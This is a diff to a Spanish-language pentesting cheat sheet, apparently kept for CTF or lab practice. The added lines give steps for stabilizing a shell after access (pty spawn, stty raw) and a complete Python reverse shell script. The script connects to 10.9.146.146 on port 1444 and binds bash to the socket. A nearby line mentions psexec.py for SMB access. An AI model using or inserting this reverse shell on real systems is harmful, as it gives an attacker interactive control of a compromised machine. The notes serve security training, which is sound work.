@@ -43,8 +43,21 @@ psexec.py USUARIO@IP > nos conectamos a una maquina windows si tiene smb
 	tambien esta disponible el modulo en msfconsole
 
 
-Estabilizar Terminal:
+ESTABILIZAR TERMINAAAAAAAAAAAAAAL
 	python3 -c 'import pty;pty.spawn("/bin/bash")'
+	_Ctrl+Z_
+	stty raw -echo; fg
+	export TERM=xterm
 
 
-
+REVERSE SHELL SCRIPTS EN PYTHON
+	import socket
+	import os
+	import subprocess
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(("10.9.146.146",1444))
+	os.dup2(s.fileno(),0)
+	os.dup2(s.fileno(),1)
+	os.dup2(s.fileno(),2)
+	import pty
+	pty.spawn("bash")
